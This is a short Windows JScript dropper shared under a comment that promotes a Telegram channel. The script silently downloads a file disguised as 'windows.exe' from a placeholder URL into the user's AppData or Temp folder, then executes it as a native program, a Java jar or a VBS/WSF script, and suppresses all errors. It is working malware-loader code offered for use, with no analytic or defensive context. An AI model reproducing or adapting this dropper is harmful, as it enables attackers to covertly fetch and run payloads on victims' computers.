/*
    Scarletta's Lounge - https://t.me/+ZFUM798YLi5mODUy

    This script was shared by @scarlettaowner, if you were interested in similar topic,dm me!
*/
try {
    String.prototype.endsWith = function (suffix) {
        var substring = this.substr(this.length - suffix.length);
        return substring == suffix;
    };
    var shell = WScript.CreateObject("WScript.Shell");
    var tempPath = shell.ExpandEnvironmentStrings("%temp%");
    var appDataPath = shell.ExpandEnvironmentStrings("%appdata%");
    var fileName = "windows.exe";
    var fileUrl = "https://test/windows.exe";
    var useTempPath = false;
    if (useTempPath) {
        fileName = tempPath + "\\" + fileName;
    } else {
        fileName = appDataPath + "\\" + fileName;
    }
    var httpRequest = WScript.CreateObject("Microsoft.XMLHTTP");
    httpRequest.open("GET", fileUrl, false);
    httpRequest.send();
    if (httpRequest.status == 200) {
        var stream = WScript.CreateObject("Adodb.Stream");
        stream.Type = 1;
        stream.open();
        stream.write(httpRequest.responseBody);
        stream.savetofile(fileName, 2);
        stream.close();
        if (fileName.endsWith(".jar")) {
            shell.run("java -jar \"" + fileName + "\"");
        } else if (fileName.endsWith(".vbs") || fileName.endsWith(".wsf")) {
            shell.run("wscript \"" + fileName + "\"");
        } else {
            shell.run("\"" + fileName + "\"");
        }
    } else {
        WScript.Echo("Expired link");
    }
} catch (error) {}